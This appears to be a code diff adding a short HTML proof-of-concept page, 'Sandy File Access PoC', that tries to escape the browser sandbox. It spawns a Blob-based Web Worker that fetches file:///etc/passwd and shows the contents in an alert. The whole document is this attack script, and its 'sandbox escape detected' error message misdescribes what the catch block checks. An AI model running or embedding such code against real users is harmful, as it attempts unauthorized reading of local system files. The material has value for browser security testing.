@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SandyFilebox</title>
+</head>
+<body>
+  <h1>Sandy File Access PoC</h1>
+  <button onclick="accessLocalFile()">Access Local File</button>
+
+  <script>
+    function accessLocalFile() {
+      try {
+        const worker = new Worker(URL.createObjectURL(new Blob([`
+          fetch('file:///etc/passwd')
+            .then(response => response.text())
+            .then(data => self.postMessage(data))
+            .catch(error => console.error(error));
+        `]));
+
+        worker.onmessage = function(event) {
+          alert("Local file content:\n" + event.data);
+        };
+      } catch (error) {
+        alert("Sandbox escape attempt detected. Access denied.");
+      }
+    }
+  </script>
+</body>
+</html>
